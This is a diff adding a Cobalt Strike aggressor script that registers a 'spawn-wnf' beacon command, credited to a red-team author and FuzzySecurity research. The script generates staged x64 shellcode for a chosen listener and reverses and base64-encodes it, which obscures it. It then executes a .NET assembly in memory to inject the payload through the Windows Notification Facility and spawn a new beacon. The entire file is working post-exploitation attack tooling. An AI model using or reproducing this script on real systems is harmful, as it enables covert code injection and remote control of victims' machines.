@@ -1,0 +1,28 @@
+# WNF Spawn script that uses @fuzzysec's research
+# Author: Vincent Yiu (@vysecurity)
+# Credits to @fuzzysec for the research
+# https://github.com/FuzzySecurity/Sharp-Suite
+
+
+alias spawn-wnf{
+    openPayloadHelper(lambda({
+		# Generate staged payload
+		$payload = shellcode($1, "true", "x64");
+		@array = split("",$payload);
+		@reverse = reverse(@array);
+		$rev = "";
+		for ($i = 0; $i < size(@reverse); $i++){
+			$rev = $rev . @reverse[$i];
+		}
+
+		$b64payload = base64_encode($rev);
+		bexecute_assembly!($bids, script_resource("modules/WindfarmDynamite.exe"), "-i " . $b64payload);
+		binput($bids, "Spawning $1 using WNF");
+
+	}, $bids => $1));
+}
+
+beacon_command_register("spawn-wnf", "Run spawn-wnf",
+    "Synopsis: spawn-wnf [listener]" .
+    "Spawns a new beacon using the Windows Notification Facility.
+    Info: https://github.com/FuzzySecurity/Sharp-Suite");
